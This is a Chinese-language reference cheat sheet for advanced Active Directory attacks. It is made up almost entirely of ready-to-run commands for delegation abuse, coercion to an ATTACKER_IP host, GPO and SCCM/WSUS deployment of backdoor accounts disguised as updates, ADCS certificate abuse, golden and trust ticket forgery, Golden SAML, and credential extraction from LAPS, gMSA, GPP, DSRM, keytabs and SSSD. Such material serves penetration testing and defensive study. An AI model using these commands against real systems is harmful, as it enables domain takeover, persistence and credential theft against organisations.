# 高级 Active Directory 攻击参考

## 目录
1. [委派攻击](#委派攻击)
2. [组策略对象滥用](#组策略对象滥用)
3. [RODC 攻击](#rodc-攻击)
4. [SCCM/WSUS 部署](#sccmwsus-部署)
5. [AD 证书服务 (ADCS)](#ad-证书服务-adcs)
6. [信任关系攻击](#信任关系攻击)
7. [ADFS 黄金 SAML](#adfs-黄金-saml)
8. [凭据来源](#凭据来源)
9. [Linux AD 集成](#linux-ad-集成)

---

## 委派攻击

### 非约束委派

当用户向启用了非约束委派的计算机进行身份认证时，其 TGT 会被保存到内存中。

**查找委派：**
```powershell
# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**SpoolService 滥用：**
```bash
# 检查后台打印程序服务
ls \\dc01\pipe\spoolss

# 使用 SpoolSample 触发
.\SpoolSample.exe DC01.domain.local HELPDESK.domain.local

# 或使用 printerbug.py
python3 printerbug.py 'domain/user:pass'@DC01 ATTACKER_IP
```

**使用 Rubeus 监控：**
```powershell
Rubeus.exe monitor /interval:1
```

### 约束委派

**识别：**
```powershell
Get-DomainComputer -TrustedToAuth | select -exp msds-AllowedToDelegateTo
```

**使用 Rubeus 利用：**
```powershell
# S4U2 攻击
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

**使用 Impacket 利用：**
```bash
getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Administrator -dc-ip DC_IP
```

### 基于资源的约束委派 (RBCD)

```powershell
# 创建机器账户
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# 设置委派
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$

# 获取票据
.\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 组策略对象滥用

### 查找易受攻击的 GPO

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|WriteDacl|WriteOwner")}
```

### 使用 SharpGPOAbuse 滥用

```powershell
# 添加本地管理员
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# 添加用户权限
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount attacker --GPOName "Vulnerable GPO"

# 添加即时任务
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"
```

### 使用 pyGPOAbuse 滥用 (Linux)

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
```

---

## RODC 攻击

### RODC 黄金票据

RODC 包含经过筛选的 AD 副本（排除 LAPS/Bitlocker 密钥）。为 msDS-RevealOnDemandGroup 中的主体伪造票据。

### RODC 密钥列表攻击

**要求：**
- RODC 的 krbtgt 凭据 (-rodcKey)
- RODC 的 krbtgt 账户 ID (-rodcNo)

```bash
# Impacket 密钥列表攻击
keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full

# 使用 secretsdump 配合密钥列表
secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
```

**使用 Rubeus：**
```powershell
Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES256_KEY /user:Administrator /id:500 /domain:domain.local /sid:S-1-5-21-xxx
```

---

## SCCM/WSUS 部署

### 使用 MalSCCM 进行 SCCM 攻击

```bash
# 定位 SCCM 服务器
MalSCCM.exe locate

# 枚举目标
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers

# 创建目标组
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET-PC

# 创建恶意应用程序
MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"

# 部署
MalSCCM.exe app /deploy /name:backdoor /groupname:TargetGroup /assignmentname:update

# 强制签入
MalSCCM.exe checkin /groupname:TargetGroup

# 清理
MalSCCM.exe app /cleanup /name:backdoor
MalSCCM.exe group /delete /groupname:TargetGroup
```

### SCCM 网络访问账户

```powershell
# 查找 SCCM blob
Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

# 使用 SharpSCCM 解密
.\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
```

### WSUS 部署攻击

```bash
# 使用 SharpWSUS
SharpWSUS.exe locate
SharpWSUS.exe inspect

# 创建恶意更新
SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\"" /title:"Critical Update"

# 部署到目标
SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"

# 检查状态
SharpWSUS.exe check /updateid:GUID /computername:TARGET.domain.local

# 清理
SharpWSUS.exe delete /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
```

---

## AD 证书服务 (ADCS)

### ESC1 - 配置错误的模板

模板允许 ENROLLEE_SUPPLIES_SUBJECT 且具有客户端身份认证 EKU。

```bash
# 查找易受攻击的模板
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable

# 以管理员身份请求证书
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template VulnTemplate -upn administrator@domain.local

# 认证
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 - ACL 漏洞

```python
# 检查 WriteProperty
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -get-acl

# 添加 ENROLLEE_SUPPLIES_SUBJECT 标志
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

# 执行 ESC1，然后恢复
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -value 0 -property mspki-Certificate-Name-Flag
```

### ESC8 - NTLM 中继到 Web Enrollment

```bash
# 启动中继
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 强制认证
python3 petitpotam.py ATTACKER_IP DC_IP

# 使用证书
Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
```

### Shadow Credentials

```bash
# 添加 Key Credential (pyWhisker)
python3 pywhisker.py -d "domain.local" -u "user1" -p "password" --target "TARGET" --action add

# 使用 PKINIT 获取 TGT
python3 gettgtpkinit.py -cert-pfx "cert.pfx" -pfx-pass "password" "domain.local/TARGET" target.ccache

# 获取 NT 哈希
export KRB5CCNAME=target.ccache
python3 getnthash.py -key 'AS-REP_KEY' domain.local/TARGET
```

---

## 信任关系攻击

### 子域到父域 (SID History)

```powershell
# 从父域获取 Enterprise Admins SID
$ParentSID = "S-1-5-21-PARENT-DOMAIN-SID-519"

# 创建带 SID History 的黄金票据
kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CHILD-SID /krbtgt:KRBTGT_HASH /sids:$ParentSID /ptt
```

### 林到林 (信任票据)

```bash
# 转储信任密钥
lsadump::trust /patch

# 伪造跨领域 TGT
kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Administrator /service:krbtgt /target:external.com /ticket:trust.kirbi

# 使用信任票据
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/target.external.com /dc:dc.external.com /ptt
```

---

## ADFS 黄金 SAML

**要求：**
- ADFS 服务账户访问权限
- 令牌签名证书 (PFX + 解密密码)

```bash
# 使用 ADFSDump 转储
.\ADFSDump.exe

# 伪造 SAML 令牌
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.domain.local saml2 --endpoint https://target/saml --nameid administrator@domain.local
```

---

## 凭据来源

### LAPS 密码

```powershell
# PowerShell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

# CrackMapExec
crackmapexec ldap DC_IP -u user -p password -M laps
```

### GMSA 密码

```powershell
# PowerShell + DSInternals
$gmsa = Get-ADServiceAccount -Identity 'SVC_ACCOUNT' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

```bash
# Linux 使用 bloodyAD
python bloodyAD.py -u user -p password --host DC_IP getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```

### 组策略首选项 (GPP)

```bash
# 在 SYSVOL 中查找
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml

# 解密
python3 Get-GPPPassword.py -no-pass 'DC_IP'
```

### DSRM 凭据

```powershell
# 转储 DSRM 哈希
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# 启用 DSRM 管理员登录
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

---

## Linux AD 集成

### CCACHE 票据重用

```bash
# 查找票据
ls /tmp/ | grep krb5cc

# 使用票据
export KRB5CCNAME=/tmp/krb5cc_1000
```

### 从 Keytab 提取

```bash
# 列出密钥
klist -k /etc/krb5.keytab

# 使用 KeyTabExtract 提取
python3 keytabextract.py /etc/krb5.keytab
```

### 从 SSSD 提取

```bash
# 数据库位置
/var/lib/sss/secrets/secrets.ldb

# 密钥位置
/var/lib/sss/secrets/.secrets.mkey

# 提取
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
